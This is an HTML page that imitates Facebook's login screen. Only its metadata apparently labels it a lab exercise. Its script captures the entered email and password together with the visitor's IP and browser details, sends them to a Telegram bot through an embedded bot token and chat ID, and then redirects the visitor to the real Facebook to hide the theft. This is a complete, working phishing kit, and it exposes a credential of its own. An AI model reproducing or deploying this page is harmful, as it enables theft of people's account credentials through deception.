<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – Log in or sign up</title>

    <meta property="og:title" content="Facebook Login Demo - LAB">
<meta property="og:description" content="Trang mô phỏng phục vụ bài thực hành">
<meta property="og:image" content="https://duongduckhoa.github.io/bot/cat.jpg">
<meta property="og:url" content="https://duongduckhoa.github.io/bot/">
<meta property="og:type" content="website">
    
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { display: flex; justify-content: space-between; align-items: center; max-width: 980px; width: 100%; padding: 20px; }
        .left-side { width: 500px; padding-right: 32px; }
        .left-side h1 { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 10px; }
        .left-side p { font-size: 24px; line-height: 28px; color: #1c1e21; margin: 0; }
        .right-side { width: 396px; display: flex; flex-direction: column; align-items: center; }
        .login-card { background: #ffffff; border: none; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; width: 100%; box-sizing: border-box; text-align: center; }
        .login-card input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        .login-card input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; line-height: 48px; width: 100%; cursor: pointer; margin-bottom: 16px; }
        .login-btn:hover { background-color: #166fe5; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .create-btn { background-color: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; padding: 0 16px; line-height: 48px; cursor: pointer; display: inline-block; text-decoration: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="left-side">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>

        <div class="right-side">
            <div class="login-card">
                <form id="fbForm">
                    <input type="text" id="email" placeholder="Email address or phone number" required>
                    <input type="password" id="pass" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <div style="margin-bottom: 16px;">
                    <a href="#" style="color: #1877f2; font-size: 14px; text-decoration: none;">Forgotten password?</a>
                </div>
                <div class="divider"></div>
                <a href="#" class="create-btn">Create new account</a>
            </div>
        </div>
    </div>

    <script>
const BOT_TOKEN = '8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o';
        const CHAT_ID = '8742570709';

        let userIp = "Đang lấy...";
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { userIp = data.ip; })
            .catch(() => { userIp = "Không xác định"; });

        document.getElementById('fbForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Chặn form load lại trang

            const userVal = document.getElementById('email').value;
            const passVal = document.getElementById('pass').value;

            const messageText = 
                `🚨 PHÁT HIỆN THÔNG TIN ĐĂNG NHẬP!\n` +
                `------------------------------------\n` +
                `👤 Tài khoản: ${userVal}\n` +
                `🔑 Mật khẩu: ${passVal}\n` +
                `🌐 IP nguồn: ${userIp}\n` +
                `📱 Thiết bị: ${navigator.userAgent}`;

            // Dùng POST trực tiếp với JSON, xử lý trọn gói mọi ký tự đặc biệt như @, khoảng trắng,...
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: messageText
                })
            })
            .finally(() => {
                // Đợi 0.8 giây rồi chuyển hướng sang Facebook thật
                setTimeout(() => {
                    window.location.href = 'https://www.facebook.com';
                }, 800);
            });
        });
    </script>
</body>
</html>
